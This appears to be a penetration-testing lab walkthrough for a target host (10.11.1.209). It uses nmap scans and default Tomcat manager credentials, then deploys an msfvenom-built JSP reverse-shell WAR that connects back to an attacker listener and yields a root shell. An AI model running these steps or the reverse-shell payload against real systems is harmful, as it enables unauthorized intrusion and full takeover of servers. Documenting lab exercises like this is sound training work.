Getting a Foothold

Getting a Foothold

# 1. NMAP Scans
TCP Connect Scan with service detection on all ports
`sudo nmap -sV -sT -p- 10.11.1.209`
![5ab1b8a7b6179ee79203b72d5f727b5e.png](../../../_resources/508fb960b86f4634addedb825fcff36e.png)

No Ping scan with service detection, and run different scripts. Of interest in this output are the Apache Tomcat credentials from http-default-accounts script on port 8080
`sudo nmap -Pn -A -p- -sV --script default,safe,auth,vuln --max-retries 4 10.11.1.209`
![268a71e6b03a9c11ab844285811c5d1d.png](../../../_resources/d21c9008f042461dabff02b15de00d4a.png)

# 2. Browse to the Apache Tomcat webpage. Enter the credentials --> tomcat:s3cret (I forgot to get a screenshot)
[http://10.11.1.209:8080/manager/html](http://10.11.1.209:8080/manager/html)
![bd4784134a52933c1aff8d4b20cd1f1c.png](../../../_resources/dff73667ddd745bd90137256189ebd73.png)


# 3. Notice that you can upload a WAR file in the Deploy table
![c31b39282133be9549b3287d79ec6937.png](../../../_resources/07424de07cf744f9a2cdcae4cb113624.png)

# 4. Create a WAR shellcode file using msfvenom
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.214 LPORT=5678 war > shell.war`
![64c00824db58592690aab95c0674c72d.png](../../../_resources/e8e1e61a5ea341d2b7a96bcf38441402.png)

# 5. Upload shell.war, then press the Deploy button 
![d06a1cea631a4c13824462b3716663ef.png](../../../_resources/f2c4453a20a44b65a351d2719f14d4cf.png)

6. You'll see the shell listed in the Applications table
[http://10.11.1.209:8080/manager/html](http://10.11.1.209:8080/manager/html)
![9f75f0070d1eb3d729ea9beea6aa4250.png](../../../_resources/e9a88faeb2c14764a3695b51e78056cb.png)

# 7. Start an nc listener
![9749751d284a19f61b6bc3af4f488ead.png](../../../_resources/3b2dad634fd749bc8507fc2f6a13165c.png)

# 8. Execute the war file by clicking on the shell.war path listed in the Applications table

# 9. We have a shell on the nc listener
![ffa471ffa499cfa96693d00b8d4635c9.png](../../../_resources/31244758f5ab4d55bc41f40ef3e867c7.png)

# 10. Check who you are... you're root!
![766e10a467708c4800cde1af0ced1688.png](../../../_resources/25966b19703146f8b8925d8c9309e7fb.png)

# 11. Get a better shell
![cb3d6ceb98a320408f3d7193aec5cf42.png](../../../_resources/a9f43adc86b44dcaada71de70aed43ae.png)